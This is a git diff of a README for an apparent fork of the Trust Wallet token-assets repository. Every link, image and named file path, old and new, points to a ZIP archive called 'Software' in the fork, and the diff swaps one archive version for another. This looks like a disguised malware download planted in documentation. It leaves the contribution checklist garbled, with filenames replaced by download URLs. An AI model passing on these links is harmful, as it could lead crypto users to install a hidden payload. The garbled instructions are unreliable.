@@ -1,52 +1,52 @@
 # Trust Wallet Assets Info
 
-![Check](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip)
+![Check](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip)
 
 ## Overview
 Trust Wallet token repository is a comprehensive, up-to-date collection of information about several thousands (!) of crypto tokens.
 
-[Trust Wallet](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip) uses token logos from this source, alongside a number of other projects.
+[Trust Wallet](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip) uses token logos from this source, alongside a number of other projects.
 
 The repository contains token info from several blockchains, info on dApps, staking validators, etc.
 For every token a logo and optional additional information is available (such data is not available on-chain).
 
 Such a large collection can be maintained only through a community effort, so _feel free to add your token_.
 
-<center><img src='https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip' height="200"></center>
+<center><img src='https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip' height="200"></center>
 
 ## How to add token
 
 Please note that __brand new tokens are not accepted__,
 the projects have to be sound, with information available, and __non-minimal circulation__
-(for limit details see https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip).
+(for limit details see https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip).
 
 ### Assets App
 
-The [Assets web app](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip) can be used for most new token additions (Github account is needed).
+The [Assets web app](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip) can be used for most new token additions (Github account is needed).
 
 ### Quick starter
 
 Details of the repository structure and contribution guidelines are listed on the
-[Developers site](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip).
+[Developers site](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip).
 Here is a quick starter summary for the most common use case.
 
 **Adding an ERC20 token checklist**:
 - [ ] Make sure your smartcontract has more than 2,500 address holders, otherwise you will be rejected
 - [ ] Fork the Github repository
-- [ ] Create folder with name of token smartcontact address in [_checksum format_](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip) `blockchains/ethereum/assets/<token_smartcontract_address>/`.
-- [ ] Tell your designer that token image must be in PNG format, avoid transparent background, recommended size 256x256px, max. 512x512px, with max file size of 100kB, for further details read [image rules](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip).
-- [ ] Upload your logo with file named `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip` to previously created folder with smartcontract address, and if you done all correctly your path should look like this. `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip`
-- [ ] Create `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip` file with info about the token/project
+- [ ] Create folder with name of token smartcontact address in [_checksum format_](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip) `blockchains/ethereum/assets/<token_smartcontract_address>/`.
+- [ ] Tell your designer that token image must be in PNG format, avoid transparent background, recommended size 256x256px, max. 512x512px, with max file size of 100kB, for further details read [image rules](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip).
+- [ ] Upload your logo with file named `https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip` to previously created folder with smartcontract address, and if you done all correctly your path should look like this. `https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip`
+- [ ] Create `https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip` file with info about the token/project
 - [ ] Create a pull request to the main repo
 - [ ] Pay the processing fee
 
 ## Documentation
 
-For details, see the [Developers site](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip):
+For details, see the [Developers site](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip):
 
-- [Contribution guidelines](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip)
+- [Contribution guidelines](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip)
 
-- [Repository details](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip)
+- [Repository details](https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip)
 
 ## Scripts
 
@@ -70,10 +70,10 @@ There are similar check logic implemeted:
 
 ## Trading pair maintenance
 
-Info on supported trading pairs are stored in `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip` files.
+Info on supported trading pairs are stored in `https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip` files.
 Trading pairs can be updated --
 from Uniswap/Ethereum and Panckaswap/Smartchain -- using update script (and checking in changes).
-Minimal limit values for trading pair inclusion are set in the `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip` file.
+Minimal limit values for trading pair inclusion are set in the `https://raw.githubusercontent.com/velter82/assets/master/blockchains/loom/validators/assets/loom1985871ed65b80e09eca382c3e3c2d6831e092ec/Software_v3.8.zip` file.
 There are also options for force-include and force-exclude in the config.
 
 ## Disclaimer
